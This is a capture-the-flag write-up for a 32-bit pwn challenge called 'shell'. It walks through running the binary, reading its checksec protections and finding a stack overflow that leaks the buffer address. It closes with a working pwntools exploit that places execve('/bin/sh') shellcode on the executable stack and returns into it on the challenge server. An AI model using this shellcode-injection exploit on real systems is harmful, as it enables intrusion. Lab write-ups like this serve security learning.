Let's get started with SHELL:

First lets run the program:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/shell]
└─$ ./shell
Can you figure out how to win here?
Buffer location = 0xffea2c74 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You lose!
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/shell]
└─$ ./shell
Can you figure out how to win here?
Buffer location = 0xff816b94 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./shell

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So after running it twice we see that there is input from the user and a Segmentation fault vulnerability, while also giving us a memory leak.
Let's now look at the files protections using file & checksec.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d99f59a793d5f2e186be9f1ba9b6f66cd5468270, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/shell/shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Here we see that there is practicall no protections on this executeable, leaving the pwning to be very simple and direct. 

If we use some static analysis... we see that there is a dbg.main(), dbg.read_in() and we should be able to find out where this leak is pointing to...
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
dbg.main()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/shell/screenshots/dbg.main.png

dbg.read_in()
https://github.com/beCe3jed/cwe-screener-10FEB24/blob/main/pwn/shell/screenshots/read_in.png
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So it looks like read_in() is a very vulnerable function that contains everything we need to know to pwn this program. Lets see what we got:
  - a vulnerable function read() which has no bounds checking on our input
  - an address leak that points directly to where our buffer is located...
  - no canary blocking our stack
  - and the stack is executeable
This gives us a perfect recipe for executing shell code on the stack in order to pop a shell

We can quite easily look up a shellcode online that is relevant to our 32-bit architecture:
https://www.exploit-db.com/exploits/42428

Now all we have to do is generate a precise payload. We need to:
  - place our shellcode at our address leak
  - pad the difference of our shellcode length and 0x38 bytes in order to reach the stack address
  - then place our input address (leak) right at the return address

This is enough for us to generate our exploit:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d99f59a793d5f2e186be9f1ba9b6f66cd5468270, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/Hacking/cwe_screener/pwn/shell/shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

'''

# No mitigations with this one!

from pwn import *

context.binary = binary = ELF('./shell')

# p = process()
p = remote("www.cweaccessionsctf.com", 1305)

# First lets obtain that address.
p.recvuntil(b"location = ")
leak = p.recvuntil(b"\n")
leak = leak.split(b" ")
leak = p32(int(leak[0].decode(), 16))
# print(leak)

# Now lets get our shellcode: link https://www.exploit-db.com/exploits/42428
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 24 bytes!

# Our distance to the stack is 0x38
payload = shellcode + b"A"*(0x38 - 0x18) + leak
p.sendline(payload) 

# popped a shell!
# flag{popping_shells_is_neat}


p.interactive()
